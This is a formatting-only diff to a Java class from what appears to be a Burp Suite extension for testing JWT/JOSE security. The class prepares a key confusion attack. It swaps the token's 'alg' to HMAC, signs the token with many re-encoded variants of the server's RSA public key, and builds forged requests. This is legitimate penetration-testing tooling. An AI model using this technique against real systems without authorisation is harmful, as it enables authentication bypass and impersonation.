@@ -40,8 +40,7 @@ import java.util.regex.Pattern;
 /**
  * Key Confusion Attack Info
  * <p>
- * Class holding meta data for the Key Confusion attack and for preparing all necessary parameter
- * for the actual attack.
+ * Class holding meta data for the Key Confusion attack and for preparing all necessary parameter for the actual attack.
  * 
  * @author Dennis Detering
  * @version 1.0
@@ -99,8 +98,7 @@ public class KeyConfusionInfo implements IAttackInfo {
     private static final HashMap<String, PayloadType> payloads = new HashMap<String, PayloadType>() {
         {
             for (PayloadType payload : PayloadType.values()) {
-                put(String.format("Public key transformation %02d   (0x%02X)", payload.ordinal(), payload.ordinal()),
-                        payload);
+                put(String.format("Public key transformation %02d   (0x%02X)", payload.ordinal(), payload.ordinal()), payload);
             }
         }
     };
@@ -116,8 +114,8 @@ public class KeyConfusionInfo implements IAttackInfo {
     }
 
     @Override
-    public KeyConfusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse,
-            IRequestInfo requestInfo, JoseParameter parameter) throws AttackPreparationFailedException {
+    public KeyConfusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, JoseParameter parameter)
+            throws AttackPreparationFailedException {
         this.requestResponse = requestResponse;
         this.parameter = parameter;
 
@@ -146,19 +144,17 @@ public class KeyConfusionInfo implements IAttackInfo {
 
                     for (PublicKey publicKey : publicKeys) {
                         loggerInstance.log(getClass(),
-                                "Encoded PubKey: " + Base64.encodeBase64String(publicKey.getEncoded()) + "\nFormat: "
-                                        + publicKey.getFormat(), Logger.LogLevel.DEBUG);
+                                "Encoded PubKey: " + Base64.encodeBase64String(publicKey.getEncoded()) + "\nFormat: " + publicKey.getFormat(),
+                                Logger.LogLevel.DEBUG);
 
                         // PKCS#8 / X.509
                         publicKeyVariations.put(PayloadType.PKCS8, transformKeyByPayload(PayloadType.PKCS8, publicKey));
 
                         // With header/footer
-                        publicKeyVariations.put(PayloadType.PKCS8_WITH_HEADER_FOOTER,
-                                transformKeyByPayload(PayloadType.PKCS8_WITH_HEADER_FOOTER, publicKey));
+                        publicKeyVariations.put(PayloadType.PKCS8_WITH_HEADER_FOOTER, transformKeyByPayload(PayloadType.PKCS8_WITH_HEADER_FOOTER, publicKey));
 
                         // With line feeds
-                        publicKeyVariations.put(PayloadType.PKCS8_WITH_LF,
-                                transformKeyByPayload(PayloadType.PKCS8_WITH_LF, publicKey));
+                        publicKeyVariations.put(PayloadType.PKCS8_WITH_LF, transformKeyByPayload(PayloadType.PKCS8_WITH_LF, publicKey));
 
                         // With line feeds and header/footer
                         publicKeyVariations.put(PayloadType.PKCS8_WITH_HEADER_FOOTER_LF,
@@ -189,33 +185,29 @@ public class KeyConfusionInfo implements IAttackInfo {
                     publicKeyVariations.put(PayloadType.ORIGINAL, publicKeyValue);
 
                     // Without header/footer
-                    publicKeyVariations.put(PayloadType.ORIGINAL_NO_HEADER_FOOTER,
-                            transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, publicKeyValue));
+                    publicKeyVariations
+                            .put(PayloadType.ORIGINAL_NO_HEADER_FOOTER, transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, publicKeyValue));
 
                     // Without line feeds/carriage returns
-                    publicKeyVariations.put(PayloadType.ORIGINAL_NO_LF,
-                            transformKeyByPayload(PayloadType.ORIGINAL_NO_LF, publicKeyValue));
+                    publicKeyVariations.put(PayloadType.ORIGINAL_NO_LF, transformKeyByPayload(PayloadType.ORIGINAL_NO_LF, publicKeyValue));
 
                     // Without header/footer and line feeds/carriage returns
                     publicKeyVariations.put(PayloadType.ORIGINAL_NO_HEADER_FOOTER_LF,
                             transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER_LF, publicKeyValue));
 
                     // PKCS#1, easy but hacky transformation
-                    publicKeyVariations
-                            .put(PayloadType.PKCS1, transformKeyByPayload(PayloadType.PKCS1, publicKeyValue));
+                    publicKeyVariations.put(PayloadType.PKCS1, transformKeyByPayload(PayloadType.PKCS1, publicKeyValue));
 
                     // PKCS#1 without header/footer
-                    publicKeyVariations.put(PayloadType.PKCS1_NO_HEADER_FOOTER,
-                            transformKeyByPayload(PayloadType.PKCS1_NO_HEADER_FOOTER, publicKeyValue));
+                    publicKeyVariations.put(PayloadType.PKCS1_NO_HEADER_FOOTER, transformKeyByPayload(PayloadType.PKCS1_NO_HEADER_FOOTER, publicKeyValue));
 
                     // PKCS#1 without line feeds/carriage returns
-                    publicKeyVariations.put(PayloadType.PKCS1_NO_LF,
-                            transformKeyByPayload(PayloadType.PKCS1_NO_LF, publicKeyValue));
+                    publicKeyVariations.put(PayloadType.PKCS1_NO_LF, transformKeyByPayload(PayloadType.PKCS1_NO_LF, publicKeyValue));
 
                     // PKCS#1 without header/footer and line feeds/carriage
                     // returns
-                    publicKeyVariations.put(PayloadType.PKCS1_NO_HEADER_FOOTER_LF,
-                            transformKeyByPayload(PayloadType.PKCS1_NO_HEADER_FOOTER_LF, publicKeyValue));
+                    publicKeyVariations
+                            .put(PayloadType.PKCS1_NO_HEADER_FOOTER_LF, transformKeyByPayload(PayloadType.PKCS1_NO_HEADER_FOOTER_LF, publicKeyValue));
 
                 } catch (Exception e) {
                     throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
@@ -231,27 +223,22 @@ public class KeyConfusionInfo implements IAttackInfo {
                     // entries
                     String[] components = Decoder.getComponents(this.parameter.getJoseValue());
                     String decodedHeader = Decoder.getDecoded(components[0]);
-                    String decodedHeaderReplacedAlgorithm = decodedHeader.replaceFirst("\"alg\":\"(.+?)\"",
-                            "\"alg\":\"" + algorithm + "\"");
+                    String decodedHeaderReplacedAlgorithm = decodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + algorithm + "\"");
                     String encodedHeaderReplacedAlgorithm = Decoder.getEncoded(decodedHeaderReplacedAlgorithm);
 
                     String macAlg = Crypto.getMacAlgorithmByJoseAlgorithm(algorithm, "HmacSHA256");
 
                     // Generate signature
-                    String newSignature = Decoder.getEncoded(Crypto.generateMac(
-                            macAlg,
-                            helpers.stringToBytes(publicKey.getValue()),
-                            helpers.stringToBytes(Decoder.concatComponents(new String[] {
-                                    encodedHeaderReplacedAlgorithm, components[1] }))));
+                    String newSignature = Decoder.getEncoded(Crypto.generateMac(macAlg, helpers.stringToBytes(publicKey.getValue()),
+                            helpers.stringToBytes(Decoder.concatComponents(new String[] { encodedHeaderReplacedAlgorithm, components[1] }))));
 
                     // Build new JWS String and update parameter
                     String[] newComponents = { encodedHeaderReplacedAlgorithm, components[1], newSignature };
                     String newComponentsConcatenated = Decoder.concatComponents(newComponents);
 
-                    byte[] tmpRequest = JoseParameter.updateRequest(this.requestResponse.getRequest(), this.parameter,
-                            helpers, newComponentsConcatenated);
-                    requests.add(new KeyConfusionAttackRequest(tmpRequest, publicKey.getKey().ordinal(), algorithm,
-                            publicKey.getValue(), publicKey.getValue().length()));
+                    byte[] tmpRequest = JoseParameter.updateRequest(this.requestResponse.getRequest(), this.parameter, helpers, newComponentsConcatenated);
+                    requests.add(new KeyConfusionAttackRequest(tmpRequest, publicKey.getKey().ordinal(), algorithm, publicKey.getValue(), publicKey.getValue()
+                            .length()));
                 } catch (Exception e) {
                     throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
                 }
@@ -329,8 +316,8 @@ public class KeyConfusionInfo implements IAttackInfo {
     }
 
     @Override
-    public HashMap<String, String> updateValuesByPayload(Enum payloadTypeId, String header, String payload,
-            String signature) throws AttackPreparationFailedException {
+    public HashMap<String, String> updateValuesByPayload(Enum payloadTypeId, String header, String payload, String signature)
+            throws AttackPreparationFailedException {
         String publicKeyValue = publicKey.getText();
         int publicKeyFormat = publicKeySelection.getSelectedIndex();
 
@@ -343,12 +330,10 @@ public class KeyConfusionInfo implements IAttackInfo {
 
                 try {
                     Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);
-                    modifiedKey = transformKeyByPayload(payloadTypeId,
-                            Converter.getRsaPublicKeysByJwk(publickKeyValueJson).get(0));
+                    modifiedKey = transformKeyByPayload(payloadTypeId, Converter.getRsaPublicKeysByJwk(publickKeyValueJson).get(0));
 
                 } catch (Exception e) {
-                    loggerInstance.log(getClass(), "Error in updateValuesByPayload (JWK):  " + e.getMessage(),
-                            Logger.LogLevel.ERROR);
+                    loggerInstance.log(getClass(), "Error in updateValuesByPayload (JWK):  " + e.getMessage(), Logger.LogLevel.ERROR);
                     throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                 }
 
@@ -366,8 +351,7 @@ public class KeyConfusionInfo implements IAttackInfo {
                     modifiedKey = transformKeyByPayload(payloadTypeId, publicKeyValue);
 
                 } catch (Exception e) {
-                    loggerInstance.log(getClass(), "Error in updateValuesByPayload (PEM):  " + e.getMessage(),
-                            Logger.LogLevel.ERROR);
+                    loggerInstance.log(getClass(), "Error in updateValuesByPayload (PEM):  " + e.getMessage(), Logger.LogLevel.ERROR);
                     throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                 }
 
@@ -393,8 +377,7 @@ public class KeyConfusionInfo implements IAttackInfo {
                 Decoder.getEncoded(Crypto.generateMac(
                         macAlg,
                         helpers.stringToBytes(modifiedKey),
-                        helpers.stringToBytes(Decoder.concatComponents(new String[] {
-                                Decoder.base64UrlEncode(helpers.stringToBytes(header)),
+                        helpers.stringToBytes(Decoder.concatComponents(new String[] { Decoder.base64UrlEncode(helpers.stringToBytes(header)),
                                 Decoder.base64UrlEncode(helpers.stringToBytes(payload)) })))));
 
         if (publicKeyValue.isEmpty()) {
@@ -409,9 +392,8 @@ public class KeyConfusionInfo implements IAttackInfo {
 
         switch ((PayloadType) payloadTypeId) {
             case ORIGINAL_NO_HEADER_FOOTER:
-                modifiedKey = key.replace("-----BEGIN PUBLIC KEY-----\n", "")
-                        .replaceAll("-----END PUBLIC KEY-----\\n?", "").replace("-----BEGIN RSA PUBLIC KEY-----\n", "")
-                        .replaceAll("-----END RSA PUBLIC KEY-----\\n?", "");
+                modifiedKey = key.replace("-----BEGIN PUBLIC KEY-----\n", "").replaceAll("-----END PUBLIC KEY-----\\n?", "")
+                        .replace("-----BEGIN RSA PUBLIC KEY-----\n", "").replaceAll("-----END RSA PUBLIC KEY-----\\n?", "");
                 break;
 
             case ORIGINAL_NO_LF:
@@ -419,8 +401,7 @@ public class KeyConfusionInfo implements IAttackInfo {
                 break;
 
             case ORIGINAL_NO_HEADER_FOOTER_LF:
-                modifiedKey = transformKeyByPayload(PayloadType.ORIGINAL_NO_LF,
-                        transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, key));
+                modifiedKey = transformKeyByPayload(PayloadType.ORIGINAL_NO_LF, transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, key));
                 break;
 
             case PKCS1:
@@ -428,18 +409,15 @@ public class KeyConfusionInfo implements IAttackInfo {
                 break;
 
             case PKCS1_NO_HEADER_FOOTER:
-                modifiedKey = transformKeyByPayload(PayloadType.PKCS1,
-                        transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, key));
+                modifiedKey = transformKeyByPayload(PayloadType.PKCS1, transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER, key));
                 break;
 
             case PKCS1_NO_LF:
-                modifiedKey = transformKeyByPayload(PayloadType.PKCS1,
-                        transformKeyByPayload(PayloadType.ORIGINAL_NO_LF, key));
+                modifiedKey = transformKeyByPayload(PayloadType.PKCS1, transformKeyByPayload(PayloadType.ORIGINAL_NO_LF, key));
                 break;
 
             case PKCS1_NO_HEADER_FOOTER_LF:
-                modifiedKey = transformKeyByPayload(PayloadType.PKCS1,
-                        transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER_LF, key));
+                modifiedKey = transformKeyByPayload(PayloadType.PKCS1, transformKeyByPayload(PayloadType.ORIGINAL_NO_HEADER_FOOTER_LF, key));
                 break;
 
             case ORIGINAL:
@@ -460,8 +438,7 @@ public class KeyConfusionInfo implements IAttackInfo {
         switch ((PayloadType) payloadTypeId) {
 
             case PKCS8_WITH_HEADER_FOOTER:
-                modifiedKey = "-----BEGIN PUBLIC KEY-----" + Base64.encodeBase64String(key.getEncoded())
-                        + "-----END PUBLIC KEY-----";
+                modifiedKey = "-----BEGIN PUBLIC KEY-----" + Base64.encodeBase64String(key.getEncoded()) + "-----END PUBLIC KEY-----";
                 break;
 
             case PKCS8_WITH_LF:
@@ -469,8 +446,7 @@ public class KeyConfusionInfo implements IAttackInfo {
                 break;
 
             case PKCS8_WITH_HEADER_FOOTER_LF:
-                modifiedKey = "-----BEGIN PUBLIC KEY-----\n" + base64Pem.encodeToString(key.getEncoded())
-                        + "-----END PUBLIC KEY-----";
+                modifiedKey = "-----BEGIN PUBLIC KEY-----\n" + base64Pem.encodeToString(key.getEncoded()) + "-----END PUBLIC KEY-----";
                 break;
 
             case PKCS8_WITH_HEADER_FOOTER_LF_ENDING_LF:
